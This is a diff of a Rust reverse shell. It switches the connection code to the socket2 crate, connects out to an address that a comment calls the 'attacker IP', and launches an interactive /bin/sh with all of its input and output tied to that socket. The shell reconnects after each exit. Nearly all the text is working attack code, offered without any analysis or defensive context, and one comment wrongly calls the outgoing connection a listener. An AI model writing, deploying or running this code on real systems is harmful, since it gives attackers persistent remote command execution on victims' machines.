@@ -1,8 +1,12 @@
 
-// Reverse  shell
-use std::net::TcpStream;
+use std::net::{TcpStream, SocketAddr};
 use std::process::{Command, Stdio};
 use std::{thread, time};
+
+extern crate socket2;
+
+use self::socket2::{Socket, Domain, Type};
+
 
 
 // Unix bases imports
@@ -17,16 +21,21 @@ pub fn shell(ip: String, port: String) {
 }
 
 fn sh(home: String){
-    // Open TcpStream connection
-    let s = connect(&home);
+
+    // create a TCP listener bound to two addresses
+    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();
+
+    // Connect back to attacker IP
+    socket.connect(&home.parse::<SocketAddr>().unwrap().into());
+
+    let s = socket.into_tcp_stream();
 
     // Raw FD for unix
     let fd = s.as_raw_fd();
 
     // Open shell
-    let output = Command::new("/bin/sh")
+    Command::new("/bin/sh")
         .arg("-i")
-        // Unix-based stdio
         .stdin(unsafe { Stdio::from_raw_fd(fd) })
         .stdout(unsafe { Stdio::from_raw_fd(fd) })
         .stderr(unsafe { Stdio::from_raw_fd(fd) })
@@ -38,21 +47,4 @@ fn sh(home: String){
 
     // println!("Shell exited");
     sh(home);
-}
-
-
-
-
-
-fn connect(home: &String) -> TcpStream {
-    let ten_millis = time::Duration::from_millis(1000);
-
-    // Unwrap input
-    let stream = TcpStream::connect(&home);
-    if stream.is_ok() {
-        return stream.unwrap()
-    } else {
-        thread::sleep(ten_millis);
-        connect(&home)
-    }
 }
